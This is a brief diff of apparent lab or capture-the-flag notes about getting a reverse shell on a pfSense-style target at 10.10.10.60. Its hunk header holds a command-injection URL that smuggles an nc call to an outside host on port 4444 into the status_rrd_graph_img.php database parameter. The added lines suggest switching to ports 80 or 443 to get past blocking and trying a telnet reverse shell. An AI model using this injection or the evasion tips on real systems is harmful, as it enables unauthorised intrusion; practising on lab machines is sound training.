@@ -52,3 +52,6 @@ https://10.10.10.60/status_rrd_graph_img.php?database=queues;nc+10.10.15.41+4444
 I can make the service ping me, but can't seems to get a reverse shell up.
 
 curl maybe to download file ? 
+Maybe the port am using on NC get blocked try 80 or 443
+
+try telnet reserve shell to see if both command get executed
